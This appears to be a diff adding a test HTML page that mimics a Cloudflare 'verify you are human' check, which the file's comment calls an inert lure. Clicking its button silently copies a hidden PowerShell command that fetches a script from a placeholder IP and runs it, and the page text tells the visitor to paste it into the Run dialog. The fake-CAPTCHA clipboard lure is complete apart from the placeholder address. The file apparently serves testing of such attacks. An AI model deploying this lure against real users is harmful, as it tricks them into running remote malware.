@@ -1,0 +1,18 @@
+<!doctype html>
+<!-- Test lure: hidden textarea + document.execCommand('copy'). Payload is inert (TEST-NET IP). -->
+<html><head><meta charset="utf-8"><title>Cloudflare check</title></head>
+<body>
+  <h1>Checking if the site connection is secure</h1>
+  <p>Complete the verification: press Win + R, then Ctrl + V, then press Enter.</p>
+  <button id="robot">Verify</button>
+  <script>
+    document.getElementById('robot').addEventListener('click', () => {
+      const ta = document.createElement('textarea');
+      ta.value = 'powershell -w hidden -c "iwr http://203.0.113.5/a.ps1 -UseBasicParsing | iex"';
+      ta.style.position = 'fixed'; ta.style.opacity = '0';
+      document.body.appendChild(ta); ta.focus(); ta.select();
+      window.copyResult = String(document.execCommand('copy'));
+      ta.remove();
+    });
+  </script>
+</body></html>
